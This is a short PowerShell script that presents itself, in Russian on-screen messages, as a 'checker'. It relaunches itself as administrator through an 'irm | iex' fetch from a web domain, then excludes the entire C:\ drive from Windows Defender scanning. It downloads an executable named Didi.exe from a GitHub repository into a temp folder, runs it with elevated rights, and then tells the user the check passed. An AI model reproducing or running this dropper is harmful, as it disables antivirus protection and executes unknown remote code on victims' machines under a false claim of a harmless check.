if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://your-domain.com/web-checker.ps1 | iex`""; exit }; Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue; Write-Host "Вы в чекере" -ForegroundColor Green; $fileUrl = "https://github.com/zzzklkl521-afk/xs/raw/main/Didi.exe"; $fileName = "Didi.exe"; $tempPath = "$env:TEMP\checker"; if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath -Force | Out-Null }; $filePath = Join-Path $tempPath $fileName; try { if (!(Test-Path $filePath)) { Write-Host "Скачивание файла..." -ForegroundColor Yellow; Invoke-WebRequest -Uri $fileUrl -OutFile $filePath -UseBasicParsing } else { Write-Host "Файл уже существует, запускаем..." -ForegroundColor Yellow }; if (Test-Path $filePath) { Start-Process -FilePath $filePath -Verb RunAs -Wait; Write-Host "Успешно проверка пройдена" -ForegroundColor Green } else { Write-Host "Ошибка: файл не найден" -ForegroundColor Red } } catch { Write-Host "Ошибка при скачивании: $($_.Exception.Message)" -ForegroundColor Red }
